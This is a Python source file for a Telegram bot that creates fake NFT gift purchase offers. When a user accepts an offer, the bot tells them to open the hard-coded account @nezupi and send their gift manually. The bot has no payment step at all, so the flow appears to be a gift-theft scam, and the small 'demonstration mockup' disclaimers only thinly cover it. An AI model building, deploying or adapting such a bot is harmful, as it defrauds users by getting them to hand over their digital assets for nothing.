import os
import asyncio
import sqlite3
import html
import uuid

from urllib.parse import urlparse
from aiohttp import web

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    CallbackQuery,
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BotCommand
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode


# =========================
# НАСТРОЙКИ
# =========================

BOT_TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.getenv("PORT", "10000"))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")
DB_PATH = os.getenv("DB_PATH", "users.db")

if not BOT_TOKEN:
    raise RuntimeError("Не задан BOT_TOKEN")

if not RENDER_URL:
    raise RuntimeError("Не найден RENDER_EXTERNAL_URL")

WEBHOOK_URL = f"{RENDER_URL}/webhook"


bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(
        parse_mode=ParseMode.HTML
    )
)

dp = Dispatcher()
offers = {}


# =========================
# БАЗА ДАННЫХ
# =========================

db = sqlite3.connect(DB_PATH)

db.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    access INTEGER DEFAULT 1
)
""")

db.commit()


def save_user(user_id, username):
    username = username.lower() if username else None

    db.execute("""
    INSERT INTO users (user_id, username, access)
    VALUES (?, ?, 1)
    ON CONFLICT(user_id)
    DO UPDATE SET username = excluded.username
    """, (user_id, username))

    db.commit()


def get_user_by_username(username):
    username = username.lstrip("@").lower()

    result = db.execute(
        "SELECT user_id FROM users WHERE username = ?",
        (username,)
    ).fetchone()

    return result[0] if result else None


# =========================
# КНОПКИ
# =========================

def offer_keyboard(offer_id):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Accept",
                    callback_data=f"accept:{offer_id}"
                ),
                InlineKeyboardButton(
                    text="❌ Decline",
                    callback_data=f"decline:{offer_id}"
                )
            ]
        ]
    )


def transfer_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎁 Transfer Gift",
                    url="https://t.me/nezupi"
                )
            ]
        ]
    )


# =========================
# START
# =========================

@dp.message(F.text == "/start")
async def start(message: Message):
    user = message.from_user

    save_user(user.id, user.username)

    await message.answer(
        "👋 <b>Добро пожаловать!</b>\n\n"
        "✅ Доступ к боту открыт!\n\n"
        "Теперь вы можете создавать предложения "
        "через команду <code>.buy</code>.\n\n"
        "📌 Пример использования:\n"
        "<code>.buy https://t.me/nft/123 100 stars</code>"
    )


# =========================
# СОЗДАНИЕ ПРЕДЛОЖЕНИЯ
# =========================

@dp.message(F.text.startswith(".buy "))
async def create_offer(message: Message):
    user = message.from_user

    save_user(user.id, user.username)

    try:
        parts = message.text.split(maxsplit=3)

        if len(parts) != 4:
            raise ValueError

        _, gift_link, price, currency = parts

        currency = currency.lower()

        if currency not in ("stars", "gram"):
            await message.answer(
                "❌ Валюта должна быть stars или gram."
            )
            return

        price_value = float(price.replace(",", "."))

        if price_value <= 0:
            raise ValueError

        parsed = urlparse(gift_link)

        if parsed.scheme not in ("http", "https") or not parsed.netloc:
            raise ValueError

        offer_id = uuid.uuid4().hex[:10]

        safe_link = html.escape(gift_link, quote=True)

        currency_text = (
            "⭐ Stars" if currency == "stars"
            else "💎 GRAM"
        )

        text = (
            "🎁 <b>Демонстрационное предложение</b>\n\n"
            f"🔗 <a href='{safe_link}'>Ссылка на NFT</a>\n"
            f"💰 Цена: <b>{price_value:g} {currency_text}</b>\n\n"
            "⚠️ <i>Демонстрационный макет. "
            "Сделка не выполняется.</i>"
        )

        offers[offer_id] = True

        await message.answer(
            text,
            reply_markup=offer_keyboard(offer_id)
        )

    except ValueError:
        await message.answer(
            "❌ Неверный формат.\n\n"
            "Пример:\n"
            "<code>.buy https://t.me/nft/123 100 stars</code>"
        )


# =========================
# ACCEPT
# =========================

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]

    if offer_id not in offers:
        await callback.answer(
            "Предложение недоступно.",
            show_alert=True
        )
        return

    await callback.message.edit_text(
        "✅ <b>Предложение принято!</b>\n\n"
        "🎁 Для продолжения нажмите Transfer Gift.\n\n"
        "📩 <b>Инструкция:</b>\n"
        "1. Нажмите Transfer Gift.\n"
        "2. Откроется профиль @nezupi.\n"
        "3. В профиле нажмите «Отправить подарок».\n"
        "4. Выберите подарок и подтвердите отправку вручную.\n\n"
        "⚠️ <i>Демонстрационный макет. "
        "Автоматической передачи подарков нет.</i>",
        reply_markup=transfer_keyboard()
    )

    await callback.answer("Принято!")


# =========================
# DECLINE
# =========================

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]

    offers.pop(offer_id, None)

    await callback.message.edit_text(
        "❌ <b>Предложение отклонено.</b>"
    )

    await callback.answer("Отклонено")


# =========================
# СОХРАНЕНИЕ USERNAME
# =========================

@dp.message()
async def remember_user(message: Message):
    user = message.from_user

    if user:
        save_user(user.id, user.username)


# =========================
# WEBHOOK
# =========================

async def health(request):
    return web.Response(text="Bot is running")


async def webhook(request):
    if WEBHOOK_SECRET:
        received = request.headers.get(
            "X-Telegram-Bot-Api-Secret-Token"
        )

        if received != WEBHOOK_SECRET:
            raise web.HTTPUnauthorized()

    data = await request.json()

    update = Update.model_validate(
        data,
        context={"bot": bot}
    )

    await dp.feed_update(bot, update)

    return web.Response(text="OK")


# =========================
# ЗАПУСК
# =========================

async def main():

    await bot.set_my_commands([
        BotCommand(
            command="start",
            description="Запустить бота"
        )
    ])

    app = web.Application()

    app.router.add_get("/", health)
    app.router.add_post("/webhook", webhook)

    await bot.set_webhook(
        WEBHOOK_URL,
        secret_token=WEBHOOK_SECRET or None
    )

    runner = web.AppRunner(app)

    await runner.setup()

    site = web.TCPSite(
        runner,
        "0.0.0.0",
        PORT
    )

    await site.start()

    print("Bot started successfully!")
    print("Webhook is active!")
    print("Free access enabled!")

    try:
        await asyncio.Event().wait()

    finally:
        await bot.delete_webhook()
        await runner.cleanup()
        await bot.session.close()
        db.close()


if __name__ == "__main__":
    asyncio.run(main())
